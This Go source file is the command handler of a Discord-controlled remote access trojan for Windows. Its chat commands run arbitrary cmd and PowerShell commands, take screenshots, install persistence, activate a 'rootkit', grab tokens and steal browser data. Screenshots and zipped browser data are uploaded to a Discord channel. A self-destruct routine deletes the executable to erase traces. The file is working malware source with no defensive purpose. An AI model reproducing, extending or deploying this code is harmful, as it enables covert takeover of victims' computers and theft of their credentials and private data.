package handlers

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
)

type Manager struct {
	persistence *PersistenceManager
	system      *SystemManager
	stealth     *StealthManager
}

func NewManager() *Manager {
	return &Manager{
		persistence: NewPersistenceManager(),
		system:      NewSystemManager(),
		stealth:     NewStealthManager(),
	}
}

func (m *Manager) Execute(ctx context.Context, command string, args []string, session *discordgo.Session, channelID string) string {
	argStr := strings.Join(args, " ")

	switch command {
	case "cmd":
		if argStr == "" {
			return "❌ Usage: !cmd <command>"
		}
		return m.system.ExecuteCMD(ctx, argStr)

	case "shell", "ps":
		if argStr == "" {
			return "❌ Usage: !shell <command>"
		}
		return m.system.ExecutePowerShell(ctx, argStr)

	case "screen":
		return m.handleScreenshot(ctx, session, channelID)

	case "persist", "persistence":
		return m.persistence.EnsureAll()

	case "hide", "rootkit":
		return m.stealth.ActivateRootkit()

	case "tokens", "tokengrab":
		return m.handleTokenGrab(ctx)

	case "browser", "browserdata":
		return m.handleBrowserData(ctx, session, channelID)

	case "exit", "kill":
		return m.handleSelfDestruct(ctx)

	default:
		return ""
	}
}

func (m *Manager) EnsurePersistence() string {
	return m.persistence.EnsureAll()
}

func (m *Manager) handleScreenshot(ctx context.Context, session *discordgo.Session, channelID string) string {
	filePath, err := m.system.TakeScreenshot()
	if err != nil {
		return fmt.Sprintf("❌ Screenshot failed: %v", err)
	}
	defer os.Remove(filePath)

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Sprintf("❌ Error opening screenshot: %v", err)
	}
	defer file.Close()

	session.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
		Content: "📸 **Screenshot:**",
		Files: []*discordgo.File{
			{
				Name:        "screenshot.png",
				ContentType: "image/png",
				Reader:      file,
			},
		},
	})

	return ""
}

func (m *Manager) handleTokenGrab(ctx context.Context) string {
	return GrabTokens()
}

func (m *Manager) handleBrowserData(ctx context.Context, session *discordgo.Session, channelID string) string {
	filePath, summary := StealBrowserData()
	if filePath != "" {
		file, err := os.Open(filePath)
		if err != nil {
			return fmt.Sprintf("❌ Error opening ZIP: %v", err)
		}
		defer file.Close()
		defer os.Remove(filePath)

		session.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
			Content: summary,
			Files: []*discordgo.File{
				{
					Name:        filepath.Base(filePath),
					ContentType: "application/zip",
					Reader:      file,
				},
			},
		})
		return ""
	}
	return summary
}

func (m *Manager) handleSelfDestruct(ctx context.Context) string {
	m.persistence.RemoveAll()

	go func() {
		time.Sleep(3 * time.Second)

		exePath, _ := os.Executable()
		cmd := fmt.Sprintf(`timeout /t 2 /nobreak > nul && del /f /q "%s" 2>nul`, exePath)
		m.system.ExecuteCMD(context.Background(), cmd)

		os.Exit(0)
	}()

	return "💥 Self-destruct initiated. Cleaning traces..."
}
